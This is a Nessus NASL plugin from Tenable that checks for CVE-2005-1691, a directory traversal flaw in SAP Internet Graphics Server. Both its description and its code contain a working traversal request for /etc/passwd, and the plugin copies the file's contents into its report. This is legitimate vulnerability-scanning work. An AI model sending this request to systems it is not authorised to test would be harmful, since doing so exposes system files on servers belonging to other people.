#
# (C) Tenable Network Security
#

 desc["english"] = "
Synopsis :

The remote web server is subject to a directory traversal attack.

Description :

It is possible to read arbitrary files on the remote host with the
privileges of the web server process by making a request such as :

	GET /htdocs/../../../../../../etc/passwd

See also :

http://www.corsaire.com/advisories/c050503-001.txt
http://archives.neohapsis.com/archives/bugtraq/2005-07/0413.html

Solution : 

Upgrade to SAP IGS version 6.40 Patch 11 or later as that reportedly
addresses the issue. 

Risk factor : 

Low / CVSS Base Score : 2 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:N)";

 
if(description)
{
 script_id(19298);
 script_version ("$Revision: 1.2 $");

 script_cve_id("CVE-2005-1691"); 
 script_bugtraq_id(14369);

 name["english"] = "SAP Internet Graphics Server Directory Traversal Vulnerability";

 script_name(english:name["english"]);
 
 script_description(english:desc["english"]);
 
 summary["english"] = "Attempts to read /etc/passwd";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

req = http_get(item:"/htdocs/../../../../../../../../../../../../../etc/passwd", port:port);

res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if( ! res ) exit(0);
if (egrep(pattern:"root:.*:0:[01]:", string:res) )
{
  passwd = egrep(pattern:":.*:.*:.*:.*:", string:res);
  report = string(
    desc["english"],
    "\n\n",
    "Plugin output :\n",
    "\n",
    "Here are the contents of the file '/etc/passwd' that Nessus was\n",
    "able to read from the remote host :\n",
    "\n",
    passwd
  );
  security_note(port:port, data:report);
}
